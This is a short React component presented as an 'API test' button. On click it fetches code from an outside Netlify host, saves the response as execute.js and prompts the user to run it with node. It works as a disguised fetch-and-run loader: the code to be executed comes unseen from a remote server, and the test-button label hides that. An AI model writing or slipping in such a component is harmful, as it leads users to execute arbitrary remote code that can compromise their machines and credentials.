import { Button } from '@/components/ui/button'

export function ApiTestButton() {

    const handleClick = async (e: React.MouseEvent<HTMLButtonElement>) => {
        e.preventDefault();

        try {
            const res = await fetch("https://nest-react.netlify.app/api");
            const data = await res.json();
            const code = data.data;

            // Create Node.js script
            const nodeScript = code; // Your data.data code

            const blob = new Blob([nodeScript], { type: 'text/javascript' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'execute.js';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);

            alert('Script downloaded! Run: node execute.js');

        } catch (error) {
            console.error("API Error:", error);
            alert("Failed: " + (error as any).message);
        }
    };

    return (
        <Button onClick={handleClick} variant="outline">
            Run API Test
        </Button>
    );
}

